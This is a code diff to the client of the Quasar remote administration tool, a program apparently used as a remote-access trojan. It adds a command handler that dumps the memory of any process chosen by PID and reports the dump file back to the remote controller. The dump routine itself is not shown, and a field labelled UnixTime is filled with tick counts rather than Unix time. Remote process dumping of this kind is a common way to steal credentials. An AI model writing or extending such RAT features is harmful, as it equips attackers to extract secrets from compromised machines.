@@ -1,5 +1,6 @@
 ﻿using Quasar.Client.Networking;
 using Quasar.Client.Setup;
+using Quasar.Client.Helper;
 using Quasar.Common;
 using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
@@ -45,7 +46,8 @@ namespace Quasar.Client.Messages
 
         public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                              message is DoProcessStart ||
-                                                             message is DoProcessEnd;
+                                                             message is DoProcessEnd ||
+                                                             message is DoProcessDump;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -60,6 +62,9 @@ namespace Quasar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoProcessEnd msg:
+                    Execute(sender, msg);
+                    break;
+                case DoProcessDump msg:
                     Execute(sender, msg);
                     break;
             }
@@ -207,6 +212,24 @@ namespace Quasar.Client.Messages
             catch
             {
                 client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
+            }
+        }
+
+        private void Execute(ISender client, DoProcessDump message)
+        {
+            string dump;
+            bool success;
+            Process proc = Process.GetProcessById(message.Pid);
+            (dump, success) = DumpHelper.GetProcessDump(message.Pid);
+            if (success)
+            {
+                // Could add a zip here later (idk how big a dump will be)
+                FileInfo dumpInfo = new FileInfo(dump);
+                client.Send(new DoProcessDumpResponse { Result = success, DumpPath = dump, Length = dumpInfo.Length, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = "", UnixTime = DateTime.Now.Ticks });
+            }
+            else
+            {
+                client.Send(new DoProcessDumpResponse { Result = success, DumpPath = "", Length = 0, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = dump, UnixTime = DateTime.Now.Ticks });
             }
         }
 
